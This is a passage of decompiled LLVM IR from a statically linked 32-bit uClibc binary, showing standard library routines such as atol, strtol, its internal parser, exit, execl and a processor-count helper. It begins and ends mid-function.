  %v2_80622ef = inttoptr i32 %v1_80622ef to i32*
  store i32 %v3_80622ec, i32* %v2_80622ef, align 4
  br label %dec_label_pc_80622f1

dec_label_pc_80622f1:                             ; preds = %dec_label_pc_80622bc, %dec_label_pc_80622dc
  %v0_80622f1 = load i32, i32* %esi.global-to-local, align 4
  %v1_80622f1 = load i32, i32* %ecx.global-to-local, align 4
  %v2_80622f1 = mul i32 %v1_80622f1, 4
  %v3_80622f1 = add i32 %v2_80622f1, %v0_80622f1
  %v1_80622f4 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80622f4 = add i32 %v1_80622f4, 16
  %v3_80622f4 = inttoptr i32 %v2_80622f4 to i32*
  store i32 %v3_80622f1, i32* %v3_80622f4, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_80622f9 = load i32, i32* %esi.global-to-local, align 4
  %v1_80622f9 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80622f9 = add i32 %v1_80622f9, 8
  %v3_80622f9 = inttoptr i32 %v2_80622f9 to i32*
  store i32 %v0_80622f9, i32* %v3_80622f9, align 4
  %v0_8062311.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_806230d

dec_label_pc_80622fe:                             ; preds = %dec_label_pc_80622a8
  store i32 22, i32* inttoptr (i32 -8 to i32*), align 8
  store i1 false, i1* %zf.global-to-local, align 1
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_806230d

dec_label_pc_806230d:                             ; preds = %dec_label_pc_80622f1, %dec_label_pc_80622fe
  %v0_8062311 = phi i32 [ %v0_8062311.pre, %dec_label_pc_80622f1 ], [ -1, %dec_label_pc_80622fe ]
  %v2_806230e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_806230e, i32* @ebx, align 4
  ret i32 %v0_8062311

; uselistorder directives
  uselistorder i32 %v0_80622c7, { 1, 0 }
  uselistorder i8 %v12_80622b3, { 2, 3, 1, 0, 4 }
  uselistorder i32 %tmp6, { 0, 1, 3, 2 }
  uselistorder i32 ptrtoint (i8** @global_var_806fb70.1636 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_806fb75.1635 to i32), { 1, 0 }
  uselistorder i64 5, { 1, 0 }
  uselistorder label %dec_label_pc_806230d, { 1, 0 }
  uselistorder label %dec_label_pc_80622f1, { 1, 0 }
  uselistorder label %dec_label_pc_80622a8, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  %v3_806231f = call i32 @strtol(i32 %arg1, i32 0, i32 10)
  ret i32 %v3_806231f
}

define i32 @strtol(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_8062339 = inttoptr i32 %arg1 to i8*
  %v5_8062339 = call i32 @_stdlib_strto_l(i8* %v4_8062339, i32 %arg2, i32 %arg3, i32 1)
  ret i32 %v5_8062339
}

define i32 @_stdlib_strto_l(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8062347 = load i32, i32* @ebx, align 4
  store i32 %v0_8062347, i32* %stack_var_-16, align 4
  %v4_806234b = ptrtoint i8* %arg1 to i32
  store i32 %v4_806234b, i32* %edi.global-to-local, align 4
  store i32 %arg3, i32* %esi.global-to-local, align 4
  %v0_806235a.pre = load i32, i32* @global_var_8071900, align 256
  br label %dec_label_pc_8062358

dec_label_pc_8062357:                             ; preds = %dec_label_pc_8062358
  %v5_8062358 = and i32 %v4_8062358, -256
  %v6_8062358 = or i32 %v3_8062358, %v5_8062358
  %v1_8062357 = add i32 %v0_8062357, 1
  br label %dec_label_pc_8062358

dec_label_pc_8062358:                             ; preds = %entry, %dec_label_pc_8062357
  %v4_8062358 = phi i32 [ %v0_8062347, %entry ], [ %v6_8062358, %dec_label_pc_8062357 ]
  %v0_8062357 = phi i32 [ %v4_806234b, %entry ], [ %v1_8062357, %dec_label_pc_8062357 ]
  store i32 %v0_8062357, i32* @ecx, align 4
  %v1_8062358 = inttoptr i32 %v0_8062357 to i8*
  %v2_8062358 = load i8, i8* %v1_8062358, align 1
  %v3_8062358 = zext i8 %v2_8062358 to i32
  store i32 %v3_8062358, i32* %edx.global-to-local, align 4
  %v2_8062362 = mul nuw nsw i32 %v3_8062358, 2
  %v3_8062362 = add i32 %v2_8062362, %v0_806235a.pre
  %v4_8062362 = inttoptr i32 %v3_8062362 to i8*
  %v5_8062362 = load i8, i8* %v4_8062362, align 1
  %v6_8062362 = and i8 %v5_8062362, 32
  %v7_8062362 = icmp eq i8 %v6_8062362, 0
  %v1_8062366 = icmp eq i1 %v7_8062362, false
  br i1 %v1_8062366, label %dec_label_pc_8062357, label %dec_label_pc_8062368

dec_label_pc_8062368:                             ; preds = %dec_label_pc_8062358
  %tmp38 = trunc i32 %arg4 to i8
  %v10_8062368 = icmp eq i8 %v2_8062358, 43
  br i1 %v10_8062368, label %dec_label_pc_8062383, label %dec_label_pc_806236d

dec_label_pc_806236d:                             ; preds = %dec_label_pc_8062368
  %v10_806236d = icmp eq i8 %v2_8062358, 45
  %v1_8062375 = icmp eq i1 %v10_806236d, false
  br i1 %v1_8062375, label %dec_label_pc_8062384, label %dec_label_pc_8062383

dec_label_pc_8062383:                             ; preds = %dec_label_pc_8062368, %dec_label_pc_806236d
  %storemerge5 = phi i8 [ 1, %dec_label_pc_806236d ], [ 0, %dec_label_pc_8062368 ]
  %v1_8062383 = add i32 %v0_8062357, 1
  store i32 %v1_8062383, i32* @ecx, align 4
  br label %dec_label_pc_8062384

dec_label_pc_8062384:                             ; preds = %dec_label_pc_806236d, %dec_label_pc_8062383
  %v0_8062396 = phi i32 [ %v1_8062383, %dec_label_pc_8062383 ], [ %v0_8062357, %dec_label_pc_806236d ]
  %stack_var_-18.0 = phi i8 [ %storemerge5, %dec_label_pc_8062383 ], [ 0, %dec_label_pc_806236d ]
  %v1_8062384 = and i32 %arg3, -17
  %v2_8062384 = icmp eq i32 %v1_8062384, 0
  %v1_806238c = icmp eq i1 %v2_8062384, false
  br i1 %v1_806238c, label %dec_label_pc_80623b2, label %dec_label_pc_806238e

dec_label_pc_806238e:                             ; preds = %dec_label_pc_8062384
  %v1_806238e = add i32 %arg3, 10
  store i32 %v1_806238e, i32* %esi.global-to-local, align 4
  %v1_8062391 = inttoptr i32 %v0_8062396 to i8*
  %v2_8062391 = load i8, i8* %v1_8062391, align 1
  %v8_8062391 = icmp eq i8 %v2_8062391, 48
  %v1_8062394 = icmp eq i1 %v8_8062391, false
  br i1 %v1_8062394, label %dec_label_pc_80623a7, label %dec_label_pc_8062396

dec_label_pc_8062396:                             ; preds = %dec_label_pc_806238e
  %v1_8062396 = add i32 %v0_8062396, 1
  store i32 %v1_8062396, i32* @ecx, align 4
  %v1_8062397 = add i32 %arg3, 8
  store i32 %v1_8062397, i32* %esi.global-to-local, align 4
  %v1_806239a = inttoptr i32 %v1_8062396 to i8*
  %v2_806239a = load i8, i8* %v1_806239a, align 1
  %v2_806239e = or i8 %v2_806239a, 32
  %v10_80623a0 = icmp eq i8 %v2_806239e, 120
  %v1_80623a2 = icmp eq i1 %v10_80623a0, false
  br i1 %v1_80623a2, label %dec_label_pc_80623a7, label %dec_label_pc_80623a4

dec_label_pc_80623a4:                             ; preds = %dec_label_pc_8062396
  %v2_80623a4 = mul i32 %v1_8062397, 2
  store i32 %v2_80623a4, i32* %esi.global-to-local, align 4
  %v1_80623a6 = add i32 %v0_8062396, 2
  store i32 %v1_80623a6, i32* @ecx, align 4
  br label %dec_label_pc_80623a7

dec_label_pc_80623a7:                             ; preds = %dec_label_pc_8062396, %dec_label_pc_806238e, %dec_label_pc_80623a4
  %v0_80623cd14 = phi i32 [ %v1_8062396, %dec_label_pc_8062396 ], [ %v0_8062396, %dec_label_pc_806238e ], [ %v1_80623a6, %dec_label_pc_80623a4 ]
  %v0_806242b23 = phi i32 [ %v1_8062396, %dec_label_pc_8062396 ], [ %v4_806234b, %dec_label_pc_806238e ], [ %v1_8062396, %dec_label_pc_80623a4 ]
  %v3_80623af = phi i32 [ %v1_8062397, %dec_label_pc_8062396 ], [ %v1_806238e, %dec_label_pc_806238e ], [ %v2_80623a4, %dec_label_pc_80623a4 ]
  %v1_80623a7 = add i32 %v3_80623af, -17
  %v6_80623a7 = sub i32 16, %v3_80623af
  %v7_80623a7 = and i32 %v6_80623a7, %v3_80623af
  %v8_80623a7 = icmp slt i32 %v7_80623a7, 0
  %v10_80623a7 = icmp slt i32 %v1_80623a7, 0
  %v2_80623af = icmp eq i1 %v10_80623a7, %v8_80623a7
  %v5_80623af = select i1 %v2_80623af, i32 16, i32 %v3_80623af
  store i32 %v5_80623af, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80623b2

dec_label_pc_80623b2:                             ; preds = %dec_label_pc_8062384, %dec_label_pc_80623a7
  %v0_806242b24 = phi i32 [ %v4_806234b, %dec_label_pc_8062384 ], [ %v0_806242b23, %dec_label_pc_80623a7 ]
  %v0_80623cd13 = phi i32 [ %v0_8062396, %dec_label_pc_8062384 ], [ %v0_80623cd14, %dec_label_pc_80623a7 ]
  %v0_80623c1 = phi i32 [ %arg3, %dec_label_pc_8062384 ], [ %v5_80623af, %dec_label_pc_80623a7 ]
  %v1_80623b2 = add i32 %v0_80623c1, -2
  store i32 0, i32* %edi.global-to-local, align 4
  %v6_80623ba = icmp ugt i32 %v1_80623b2, 34
  br i1 %v6_80623ba, label %dec_label_pc_8062420, label %dec_label_pc_80623bc

dec_label_pc_80623bc:                             ; preds = %dec_label_pc_80623b2
  %div = udiv i32 -1, %v0_80623c1
  %tmp39 = urem i32 -1, %v0_80623c1
  store i32 %tmp39, i32* %edx.global-to-local, align 4
  store i32 %div, i32* %ebp.global-to-local, align 4
  %v1_80623c5 = trunc i32 %tmp39 to i8
  br label %dec_label_pc_80623cd

dec_label_pc_80623cb:                             ; preds = %dec_label_pc_8062413, %dec_label_pc_80623fa
  %v2_80623cf.pre = phi i32 [ %v1_80623e6, %dec_label_pc_8062413 ], [ %v2_80623cf.pre.pre, %dec_label_pc_80623fa ]
  %v0_80623cb = phi i32 [ %v1_80623ed, %dec_label_pc_8062413 ], [ %v0_80623cb.pre, %dec_label_pc_80623fa ]
  %stack_var_-18.1 = phi i8 [ %stack_var_-18.2, %dec_label_pc_8062413 ], [ %v6_8062401, %dec_label_pc_80623fa ]
  br label %dec_label_pc_80623cd

dec_label_pc_80623cd:                             ; preds = %dec_label_pc_80623bc, %dec_label_pc_80623cb
  %v0_806242b22 = phi i32 [ %v0_806242b24, %dec_label_pc_80623bc ], [ %v0_80623cb, %dec_label_pc_80623cb ]
  %v0_80623ed = phi i32 [ %v0_80623cd13, %dec_label_pc_80623bc ], [ %v0_80623cb, %dec_label_pc_80623cb ]
  %v2_80623cf = phi i32 [ %tmp39, %dec_label_pc_80623bc ], [ %v2_80623cf.pre, %dec_label_pc_80623cb ]
  %stack_var_-18.2 = phi i8 [ %stack_var_-18.0, %dec_label_pc_80623bc ], [ %stack_var_-18.1, %dec_label_pc_80623cb ]
  %v1_80623cd = inttoptr i32 %v0_80623ed to i8*
  %v2_80623cd = load i8, i8* %v1_80623cd, align 1
  %v2_80623d1 = add i8 %v2_80623cd, -48
  %v12_80623d1 = zext i8 %v2_80623d1 to i32
  %v14_80623d1 = and i32 %v2_80623cf, -256
  %v15_80623d1 = or i32 %v12_80623d1, %v14_80623d1
  store i32 %v15_80623d1, i32* %edx.global-to-local, align 4
  %tmp = icmp ult i8 %v2_80623d1, 10
  br i1 %tmp, label %dec_label_pc_80623e6, label %dec_label_pc_80623d9

dec_label_pc_80623d9:                             ; preds = %dec_label_pc_80623cd
  %v2_80623d9 = or i8 %v2_80623cd, 32
  %v2_80623db = or i32 %v14_80623d1, 40
  store i32 %v2_80623db, i32* %edx.global-to-local, align 4
  %tmp40 = icmp ult i8 %v2_80623d9, 97
  br i1 %tmp40, label %dec_label_pc_80623e6, label %dec_label_pc_80623e1

dec_label_pc_80623e1:                             ; preds = %dec_label_pc_80623d9
  %v2_80623e3 = add i8 %v2_80623d9, -87
  %v15_80623e3 = zext i8 %v2_80623e3 to i32
  %v18_80623e3 = or i32 %v15_80623e3, %v14_80623d1
  store i32 %v18_80623e3, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80623e6

dec_label_pc_80623e6:                             ; preds = %dec_label_pc_80623d9, %dec_label_pc_80623cd, %dec_label_pc_80623e1
  %v0_8062415 = phi i32 [ %v2_80623db, %dec_label_pc_80623d9 ], [ %v15_80623d1, %dec_label_pc_80623cd ], [ %v18_80623e3, %dec_label_pc_80623e1 ]
  %v1_80623e6 = urem i32 %v0_8062415, 256
  %v1_80623e9 = load i32, i32* %esi.global-to-local, align 4
  %v2_80623e9 = sub i32 %v1_80623e6, %v1_80623e9
  %v10_80623e9 = and i32 %v2_80623e9, %v1_80623e9
  %v11_80623e9 = icmp slt i32 %v10_80623e9, 0
  %v13_80623e9 = icmp slt i32 %v2_80623e9, 0
  %v2_80623eb = icmp eq i1 %v13_80623e9, %v11_80623e9
  br i1 %v2_80623eb, label %dec_label_pc_8062420, label %dec_label_pc_80623ed

dec_label_pc_80623ed:                             ; preds = %dec_label_pc_80623e6
  %v1_80623ed = add i32 %v0_80623ed, 1
  store i32 %v1_80623ed, i32* @ecx, align 4
  %v0_80623ee = load i32, i32* %edi.global-to-local, align 4
  %v1_80623ee = load i32, i32* %ebp.global-to-local, align 4
  %tmp41 = icmp ugt i32 %v0_80623ee, %v1_80623ee
  br i1 %tmp41, label %dec_label_pc_80623fa, label %dec_label_pc_80623f2

dec_label_pc_80623f2:                             ; preds = %dec_label_pc_80623ed
  %v12_80623ee = icmp eq i32 %v0_80623ee, %v1_80623ee
  %v1_80623f2 = icmp eq i1 %v12_80623ee, false
  br i1 %v1_80623f2, label %dec_label_pc_8062413, label %dec_label_pc_80623f4

dec_label_pc_80623f4:                             ; preds = %dec_label_pc_80623f2
  %v1_80623f4 = trunc i32 %v0_8062415 to i8
  %tmp42 = icmp ugt i8 %v1_80623f4, %v1_80623c5
  br i1 %tmp42, label %dec_label_pc_80623fa, label %dec_label_pc_8062413

dec_label_pc_80623fa:                             ; preds = %dec_label_pc_80623f4, %dec_label_pc_80623ed
  store i32 -1, i32* %edi.global-to-local, align 4
  %v6_8062401 = and i8 %stack_var_-18.2, %tmp38
  store i32 34, i32* inttoptr (i32 -8 to i32*), align 8
  %v0_80623cb.pre = load i32, i32* @ecx, align 4
  %v2_80623cf.pre.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80623cb

dec_label_pc_8062413:                             ; preds = %dec_label_pc_80623f4, %dec_label_pc_80623f2
  store i32 %v1_80623e6, i32* %edx.global-to-local, align 4
  %v4_8062418 = mul i32 %v0_80623ee, %v1_80623e9
  %v2_806241b = add i32 %v4_8062418, %v1_80623e6
  store i32 %v2_806241b, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80623cb

dec_label_pc_8062420:                             ; preds = %dec_label_pc_80623e6, %dec_label_pc_80623b2
  %v0_806242b = phi i32 [ %v0_806242b24, %dec_label_pc_80623b2 ], [ %v0_806242b22, %dec_label_pc_80623e6 ]
  %stack_var_-18.3 = phi i8 [ %stack_var_-18.0, %dec_label_pc_80623b2 ], [ %stack_var_-18.2, %dec_label_pc_80623e6 ]
  %v4_8062420 = icmp eq i32 %arg2, 0
  br i1 %v4_8062420, label %dec_label_pc_806242d, label %dec_label_pc_8062427

dec_label_pc_8062427:                             ; preds = %dec_label_pc_8062420
  %v2_806242b = inttoptr i32 %arg2 to i32*
  store i32 %v0_806242b, i32* %v2_806242b, align 4
  br label %dec_label_pc_806242d

dec_label_pc_806242d:                             ; preds = %dec_label_pc_8062420, %dec_label_pc_8062427
  %v8_806242d = icmp eq i8 %stack_var_-18.3, 0
  %v2_8062432 = zext i1 %v8_806242d to i32
  %v13_8062432 = icmp eq i1 %v8_806242d, false
  %v1_80624343 = or i32 %v2_8062432, -2147483648
  store i32 %v1_80624343, i32* %edx.global-to-local, align 4
  %v5_806243a = icmp eq i8 %tmp38, 0
  br i1 %v5_806243a, label %dec_label_pc_8062453, label %dec_label_pc_8062441

dec_label_pc_8062441:                             ; preds = %dec_label_pc_806242d
  %v0_8062441 = load i32, i32* %edi.global-to-local, align 4
  %tmp43 = icmp ugt i32 %v0_8062441, %v1_80624343
  br i1 %tmp43, label %dec_label_pc_8062445, label %dec_label_pc_8062453

dec_label_pc_8062445:                             ; preds = %dec_label_pc_8062441
  store i32 %v1_80624343, i32* %edi.global-to-local, align 4
  store i32 34, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_8062453

dec_label_pc_8062453:                             ; preds = %dec_label_pc_8062441, %dec_label_pc_806242d, %dec_label_pc_8062445
  %v0_8062453 = load i32, i32* %edi.global-to-local, align 4
  %v1_8062455 = sub i32 0, %v0_8062453
  %v2_806245c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_806245c, i32* @edx, align 4
  %v2_806245d = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_806245d, i32* @ebx, align 4
  %v4_806245e = select i1 %v13_8062432, i32 %v1_8062455, i32 %v0_8062453
  ret i32 %v4_806245e

; uselistorder directives
  uselistorder i32 %v1_80624343, { 1, 0, 2 }
  uselistorder i1 %v8_806242d, { 1, 0 }
  uselistorder i32 %v1_80623ee, { 1, 0 }
  uselistorder i32 %v0_80623ee, { 0, 2, 1 }
  uselistorder i32 %v1_80623ed, { 1, 0 }
  uselistorder i32 %v2_80623e9, { 1, 0 }
  uselistorder i32 %v1_80623e6, { 3, 1, 0, 2 }
  uselistorder i32 %v0_8062415, { 1, 0 }
  uselistorder i8 %v2_80623d9, { 1, 0 }
  uselistorder i32 %v14_80623d1, { 0, 2, 1 }
  uselistorder i32 %v0_80623cb, { 1, 0 }
  uselistorder i32 %v0_80623c1, { 1, 0, 2 }
  uselistorder i32 %v3_80623af, { 1, 0, 3, 2 }
  uselistorder i32 %v2_80623a4, { 1, 0 }
  uselistorder i32 %v1_8062397, { 1, 0, 2 }
  uselistorder i8 %stack_var_-18.0, { 1, 0 }
  uselistorder i32 %v0_8062396, { 1, 2, 0, 3, 4 }
  uselistorder i8 %tmp38, { 1, 0 }
  uselistorder i32 %v3_8062358, { 1, 2, 0 }
  uselistorder i32 %v0_8062357, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v4_806234b, { 1, 0, 2, 3 }
  uselistorder i32* %esi.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 4, 2, 3, 5, 6, 7 }
  uselistorder i32* %edi.global-to-local, { 3, 0, 4, 1, 2, 5, 6, 7 }
  uselistorder i32 -17, { 0, 3, 4, 1, 2 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8062453, { 2, 0, 1 }
  uselistorder label %dec_label_pc_806242d, { 1, 0 }
  uselistorder label %dec_label_pc_80623e6, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80623cd, { 1, 0 }
  uselistorder label %dec_label_pc_80623b2, { 1, 0 }
  uselistorder label %dec_label_pc_80623a7, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8062384, { 1, 0 }
  uselistorder label %dec_label_pc_8062383, { 1, 0 }
  uselistorder label %dec_label_pc_8062358, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v2_806247b = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_806247b, i32* @ebx, align 4
  %v4_8062480 = call i32 @_pthread_cleanup_push_defer(i32* nonnull %stack_var_-24, i32 134623208, i32 ptrtoint (i32* @global_var_8071ad4.1637 to i32))
  %v1_806248c = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8071ad4.1637 to i32))
  %v0_8062491 = load i32, i32* @global_var_8077d74.1638, align 4
  %v1_806249c = icmp eq i32 %v0_8062491, 0
  br i1 %v1_806249c, label %dec_label_pc_80624a9, label %dec_label_pc_80624a0

dec_label_pc_80624a0:                             ; preds = %entry
  %v0_80624a3 = load i32, i32* @esi, align 4
  %v1_80624a4 = call i32 @__libc_errno(i32 %v0_80624a3)
  br label %dec_label_pc_80624a9

dec_label_pc_80624a9:                             ; preds = %entry, %dec_label_pc_80624a0
  %v3_80624ae = call i32 @_pthread_cleanup_pop_restore(i32* nonnull %stack_var_-24, i32 1)
  %v0_80624b3 = call i32 @__GI___uClibc_fini()
  store i32 134609588, i32* @eax, align 4
  %v0_80624c4 = call i32 @_stdio_term()
  %v0_80624cc = load i32, i32* @esi, align 4
  %v1_80624cd = call i32 @__GI__exit(i32 %v0_80624cc)
  ret i32 %v1_80624cd

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @global_var_8071ad4.1637 to i32), { 1, 0 }
  uselistorder label %dec_label_pc_80624a9, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %v2_80624db = ptrtoint i32* %stack_var_12 to i32
  store i32 %v2_80624db, i32* %eax.global-to-local, align 4
  %v12_80624de = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_80624e4

dec_label_pc_80624e4:                             ; preds = %dec_label_pc_80624e4, %entry
  %v0_80624e7 = phi i32 [ 0, %entry ], [ %v1_80624e7, %dec_label_pc_80624e4 ]
  %stack_var_-16.0 = phi i32 [ %v2_80624db, %entry ], [ %v1_80624e8, %dec_label_pc_80624e4 ]
  %v1_80624e7 = add i32 %v0_80624e7, 1
  store i32 %v1_80624e7, i32* %esi.global-to-local, align 4
  %v1_80624e8 = add i32 %stack_var_-16.0, 4
  store i32 %v1_80624e8, i32* %eax.global-to-local, align 4
  %v1_80624ee = inttoptr i32 %stack_var_-16.0 to i32*
  %v2_80624ee = load i32, i32* %v1_80624ee, align 4
  %v3_80624ee = icmp eq i32 %v2_80624ee, 0
  %v1_80624f1 = icmp eq i1 %v3_80624ee, false
  br i1 %v1_80624f1, label %dec_label_pc_80624e4, label %dec_label_pc_80624f3

dec_label_pc_80624f3:                             ; preds = %dec_label_pc_80624e4
  %v1_80624f3 = mul i32 %v1_80624e7, 4
  %v2_80624f3 = add i32 %v1_80624f3, 34
  %v1_80624fa = and i32 %v2_80624f3, -16
  %v2_80624fd = sub i32 %v12_80624de, %v1_80624fa
  %v1_8062502 = add i32 %v2_80624fd, 15
  %v1_8062506 = and i32 %v1_8062502, -16
  store i32 %v1_8062506, i32* @ebx, align 4
  store i32 %v1_8062506, i32* %ecx.global-to-local, align 4
  %v2_806250b = inttoptr i32 %v1_8062506 to i32*
  store i32 %arg2, i32* %v2_806250b, align 16
  store i32 %v2_80624db, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8062513

dec_label_pc_8062513:                             ; preds = %dec_label_pc_8062513, %dec_label_pc_80624f3
  %stack_var_-16.1 = phi i32 [ %v2_80624db, %dec_label_pc_80624f3 ], [ %v1_806251a, %dec_label_pc_8062513 ]
  store i32 %stack_var_-16.1, i32* %eax.global-to-local, align 4
  %v0_8062516 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8062516 = add i32 %v0_8062516, 4
  store i32 %v1_8062516, i32* %ecx.global-to-local, align 4
  %v0_8062519 = load i32, i32* %esi.global-to-local, align 4
  %v1_8062519 = add i32 %v0_8062519, -1
  %v8_8062519 = icmp eq i32 %v1_8062519, 0
  store i32 %v1_8062519, i32* %esi.global-to-local, align 4
  %v1_806251a = add i32 %stack_var_-16.1, 4
  %v1_8062520 = inttoptr i32 %stack_var_-16.1 to i32*
  %v2_8062520 = load i32, i32* %v1_8062520, align 4
  store i32 %v2_8062520, i32* %eax.global-to-local, align 4
  %v2_8062522 = inttoptr i32 %v1_8062516 to i32*
  store i32 %v2_8062520, i32* %v2_8062522, align 4
  %v1_8062524 = icmp eq i1 %v8_8062519, false
  br i1 %v1_8062524, label %dec_label_pc_8062513, label %dec_label_pc_8062526

dec_label_pc_8062526:                             ; preds = %dec_label_pc_8062513
  %v0_8062526 = load i32, i32* %eax.global-to-local, align 4
  %v1_8062526 = load i32, i32* @esp, align 4
  %v2_8062526 = add i32 %v1_8062526, -4
  %v3_8062526 = inttoptr i32 %v2_8062526 to i32*
  store i32 %v0_8062526, i32* %v3_8062526, align 4
  %v0_8062527 = load i32, i32* @global_var_80782c4.1639, align 4
  %v2_8062527 = add i32 %v1_8062526, -8
  %v3_8062527 = inttoptr i32 %v2_8062527 to i32*
  store i32 %v0_8062527, i32* %v3_8062527, align 4
  %v0_806252d = load i32, i32* @ebx, align 4
  %v2_806252d = add i32 %v1_8062526, -12
  %v3_806252d = inttoptr i32 %v2_806252d to i32*
  store i32 %v0_806252d, i32* %v3_806252d, align 4
  %v5_806252e = add i32 %v1_8062526, -16
  %v6_806252e = inttoptr i32 %v5_806252e to i32*
  store i32 %arg1, i32* %v6_806252e, align 4
  %v1_8062531 = inttoptr i32 %v1_806251a to i8*
  %v2_8062531 = call i32 @__GI_execve(i8* %v1_8062531)
  store i32 %v2_8062531, i32* %eax.global-to-local, align 4
  ret i32 %v2_8062531

; uselistorder directives
  uselistorder i32 %v1_8062519, { 1, 0 }
  uselistorder i32 %stack_var_-16.1, { 1, 0, 2 }
  uselistorder i32 %v1_80624e8, { 1, 0 }
  uselistorder i32 %v1_80624e7, { 0, 2, 1 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %v2_80624db, { 0, 2, 1, 3 }
}

define i32 @nprocessors_onln(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 0, i32* %stack_var_-16, align 4
  %v2_8062553 = call i32 @__GI_config_open(i32 ptrtoint ([11 x i8]* @global_var_806fb7a.1640 to i32))
  store i32 %v2_8062553, i32* @eax, align 4
  %v1_806255b = icmp eq i32 %v2_8062553, 0
  br i1 %v1_806255b, label %dec_label_pc_80625b0, label %dec_label_pc_8062561

dec_label_pc_8062561:                             ; preds = %entry
  store i32 0, i32* @ebx, align 4
  %v2_8062563 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_8062563, i32* @edi, align 4
  br label %dec_label_pc_8062596

dec_label_pc_8062569:                             ; preds = %dec_label_pc_8062596
  %v3_8062569 = load i32, i32* %stack_var_-16, align 4
  %v1_806256d = inttoptr i32 %v3_8062569 to i32*
  %v2_806256d = load i32, i32* %v1_806256d, align 4
  %v1_806256f = inttoptr i32 %v2_806256d to i8*
  %v2_806256f = load i8, i8* %v1_806256f, align 1
  %v11_806256f = icmp eq i8 %v2_806256f, 99
  %v1_8062572 = icmp eq i1 %v11_806256f, false
  br i1 %v1_8062572, label %dec_label_pc_8062596.backedge, label %dec_label_pc_8062574

dec_label_pc_8062574:                             ; preds = %dec_label_pc_8062569
  %v1_8062574 = add i32 %v2_806256d, 1
  %v2_8062574 = inttoptr i32 %v1_8062574 to i8*
  %v3_8062574 = load i8, i8* %v2_8062574, align 1
  %v9_8062574 = icmp eq i8 %v3_8062574, 112
  %v1_8062578 = icmp eq i1 %v9_8062574, false
  br i1 %v1_8062578, label %dec_label_pc_8062596.backedge, label %dec_label_pc_806257a

dec_label_pc_806257a:                             ; preds = %dec_label_pc_8062574
  %v1_806257a = add i32 %v2_806256d, 2
  %v2_806257a = inttoptr i32 %v1_806257a to i8*
  %v3_806257a = load i8, i8* %v2_806257a, align 1
  %v12_806257a = icmp eq i8 %v3_806257a, 117
  %v1_806257e = icmp eq i1 %v12_806257a, false
  br i1 %v1_806257e, label %dec_label_pc_8062596.backedge, label %dec_label_pc_8062580

dec_label_pc_8062580:                             ; preds = %dec_label_pc_806257a
  %v1_8062580 = add i32 %v2_806256d, 3
  %v2_8062580 = inttoptr i32 %v1_8062580 to i8*
  %v3_8062580 = load i8, i8* %v2_8062580, align 1
  %v4_8062580 = zext i8 %v3_8062580 to i32
  %v0_8062584 = load i32, i32* @global_var_8071900, align 256
  %v2_8062589 = mul nuw nsw i32 %v4_8062580, 2
  %v3_8062589 = add i32 %v2_8062589, %v0_8062584
  %v4_8062589 = inttoptr i32 %v3_8062589 to i16*
  %v5_8062589 = load i16, i16* %v4_8062589, align 2
  %v1_806258d = and i16 %v5_8062589, 8
  %v2_806258d = icmp eq i16 %v1_806258d, 0
  %v0_8062593 = load i32, i32* @ebx, align 4
  %v2_8062593 = zext i1 %v2_806258d to i32
  %v3_8062593 = add i32 %v0_8062593, 1
  %v4_8062593 = add i32 %v2_8062593, %v3_8062593
  store i32 %v4_8062593, i32* @ebx, align 4
  br label %dec_label_pc_8062596.backedge

dec_label_pc_8062596.backedge:                    ; preds = %dec_label_pc_8062580, %dec_label_pc_8062569, %dec_label_pc_8062574, %dec_label_pc_806257a
  %v0_80625a1.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8062596

dec_label_pc_8062596:                             ; preds = %dec_label_pc_8062596.backedge, %dec_label_pc_8062561
